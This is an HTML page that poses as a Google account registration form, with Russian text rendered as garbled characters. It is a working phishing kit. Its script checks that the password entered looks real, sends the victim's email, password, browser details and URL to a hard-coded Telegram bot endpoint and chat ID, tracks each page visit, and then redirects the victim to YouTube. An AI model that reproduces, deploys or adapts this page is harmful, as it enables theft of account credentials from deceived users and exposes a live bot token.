<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è - Google</title>
    <style>
        * {

        }
        
        body {
            font-family: 'Google Sans', 'Arial', sans-serif;
            background: white;
            display: flex;

        .container {

        }
        
        .title {

        }
        
        .subtitle {

            font-size: 16px;
            color: #5f6368;

        }
        
        .form-group {

        }
        
        .input-group {

        }
        
        input {
            width: 100%;
            height: 54px;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        input:focus {

        }
        
        label {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: white;
            padding: 0 5px;
            color: #5f6368;
            font-size: 16px;
            transition: all 0.2s;
            pointer-events: none;
        }
        
        input:focus + label,
        input:not(:placeholder-shown) + label {

            font-size: 12px;
            color: #1a73e8;
        }
        
        .forgot-email {
            text-align: left;
            margin-bottom: 32px;
        }
        
        .forgot-email a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .forgot-email a:hover {
            text-decoration: underline;
        }
        
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .create-account:hover {

        }
        
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;

            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .next-button:hover {
            background: #1669d6;
        }
        
        .footer {
            margin-top: 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .language {
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
        }
        
        .footer-links {
            display: flex;
            gap: 24px;
        }
        
        .footer-links a {
            color: #5f6368;
            font-size: 12px;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 4px;
            text-align: center;
            font-size: 14px;
            display: none;
        }
        
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .loading {
            background-color: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" alt="Google" onerror="this.style.display='none'">
        </div>
        
        <h1 class="title">–°–æ–∑–¥–∞–π—Ç–µ –∞–∫–∫–∞—É–Ω—Ç Google</h1>
        <p class="subtitle">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ –≤ Telegram</p>

        <form id="messageForm">
            <div class="form-group">
                <div class="input-group">
                    <input type="text" id="email" name="email" placeholder=" " required>
                    <label for="email">–í–≤–µ–¥–∏—Ç–µ –ø–æ—á—Ç—É</label>
                </div>
                
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder=" " required>
                    <label for="password">–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å</label>
                </div>
            </div>

            <div class="forgot-email">
                <a href="#">–í–æ–π—Ç–∏ –≤–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ</a>
            </div>

            <div class="buttons">
                <a href="#" class="create-account">–°–æ–∑–¥–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç</a>
                <button type="submit" class="next-button">–î–∞–ª–µ–µ</button>
            </div>
        </form>

        <div id="status"></div>

        <div class="footer">
            <div class="language">
                –†—É—Å—Å–∫–∏–π
            </div>
            <div class="footer-links">
                <a href="#">–°–ø—Ä–∞–≤–∫–∞</a>
                <a href="#">–ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å</a>
                <a href="#">–£—Å–ª–æ–≤–∏—è</a>
            </div>
        </div>
    </div>

<script>
// –§—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —á—Ç–æ –ø–∞—Ä–æ–ª—å –≤—ã–≥–ª—è–¥–∏—Ç —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω–æ
function isRealisticPassword(password) {
    // –°–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–µ
    if (password.length < 6) {
        return {valid: false, message: '–ü–∞—Ä–æ–ª—å —Å–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π'};
    }
    
    // –°–ª–∏—à–∫–æ–º –ø—Ä–æ—Å—Ç—ã–µ (—Ç–∏–ø–∞ 123456)
    const weakPasswords = [
        '123456', '12345678', '123456789', '12345', 
        'password', 'qwerty', 'abc123', '111111', '000000'
    ];
    if (weakPasswords.includes(password.toLowerCase())) {
        return {valid: false, message: '–°–ª–∏—à–∫–æ–º –ø—Ä–æ—Å—Ç–æ–π –ø–∞—Ä–æ–ª—å'};
    }
    
    // –¢–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã
    if (/^\d+$/.test(password)) {
        return {valid: false, message: '–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å –±—É–∫–≤—ã'};
    }
    
    // –¢–æ–ª—å–∫–æ –±—É–∫–≤—ã
    if (/^[a-zA-Z]+$/.test(password)) {
        return {valid: false, message: '–î–æ–±–∞–≤—å—Ç–µ —Ü–∏—Ñ—Ä—ã –≤ –ø–∞—Ä–æ–ª—å'};
    }
    
    // –ü–æ—Ö–æ–∂ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π –ø–∞—Ä–æ–ª—å
    return {valid: true, message: '–ü–∞—Ä–æ–ª—å –ø—Ä–∏–Ω—è—Ç'};
}

// –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
document.addEventListener('DOMContentLoaded', function() {
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤—Ö–æ–¥–µ
    fetch('/api/track', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            action: '–ó–∞—à–µ–ª –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏',
            userAgent: navigator.userAgent
        })
    }).catch(err => console.log('Track error:', err));

    // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–æ—Ä–º—ã
    document.getElementById('messageForm').addEventListener('submit', async function(event) {
        event.preventDefault();

        const form = event.target;
        const formData = new FormData(form);
        const email = formData.get('email');
        const password = formData.get('password');
        const statusDiv = document.getElementById('status');
        const submitBtn = document.querySelector('.next-button');

        // –ü–†–û–í–ï–†–ö–ê –ü–ê–†–û–õ–Ø
        const passwordCheck = isRealisticPassword(password);
        if (!passwordCheck.valid) {
            statusDiv.style.display = 'block';
            statusDiv.className = 'error';
            statusDiv.textContent = '‚ùå ' + passwordCheck.message;
            return;
        }

        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
        statusDiv.style.display = 'block';
        statusDiv.className = 'loading';
        statusDiv.textContent = '‚è≥ –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∞–Ω–Ω—ã—Ö...';
        submitBtn.disabled = true;

        try {
            // –ü–†–Ø–ú–ê–Ø –æ—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º—ã –≤ Telegram
            const response = await fetch('https://api.telegram.org/bot8591266062:AAEwMbSDWQXYmZ6W9CekGxlnJUqRQIB0v8M/sendMessage', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: '6812452143',
                    text: `üì® –ù–û–í–´–ï –î–ê–ù–ù–´–ï üì®\n\nüë§ –î–∞–Ω–Ω—ã–µ —Ñ–æ—Ä–º—ã:\nüìß –ü–æ—á—Ç–∞: ${email}\nüîë –ü–∞—Ä–æ–ª—å: ${password}\n\nüåê –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:\nüì± –ë—Ä–∞—É–∑–µ—Ä: ${navigator.userAgent}\nüìç URL: ${window.location.href}\n‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`
                })
            });

            const result = await response.json();

            if (result.ok) {
                statusDiv.textContent = '‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã! –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...';
                statusDiv.className = 'success';
                form.reset();
                
                // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
                setTimeout(() => {
                    window.location.href = 'https://www.youtube.com';
                }, 2000);
            } else {
                statusDiv.textContent = '‚ùå –û—à–∏–±–∫–∞: ' + (result.description || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞');
                statusDiv.className = 'error';
            }

        } catch (error) {
            console.error('–û—à–∏–±–∫–∞:', error);
            statusDiv.textContent = '‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏';
            statusDiv.className = 'error';
        }

        statusDiv.style.display = 'block';
        submitBtn.disabled = false;
    });
});

// –ï—Å–ª–∏ –ª–æ–≥–æ—Ç–∏–ø –Ω–µ –∑–∞–≥—Ä—É–∑–∏—Ç—Å—è, –ø–æ–∫–∞–∂–µ–º —Ç–µ–∫—Å—Ç–æ–≤—ã–π –≤–∞—Ä–∏–∞–Ω—Ç
document.querySelector('.google-logo img').addEventListener('error', function() {
    this.style.display = 'none';
    const textLogo = document.createElement('div');
    textLogo.innerHTML = '<span style="color: #4285f4; font-size: 24px; font-weight: bold;">G</span><span style="color: #ea4335; font-size: 24px; font-weight: bold;">o</span><span style="color: #fbbc05; font-size: 24px; font-weight: bold;">o</span><span style="color: #4285f4; font-size: 24px; font-weight: bold;">g</span><span style="color: #34a853; font-size: 24px; font-weight: bold;">l</span><span style="color: #ea4335; font-size: 24px; font-weight: bold;">e</span>';
    document.querySelector('.google-logo').appendChild(textLogo);
});
</script>
</body>
</html>
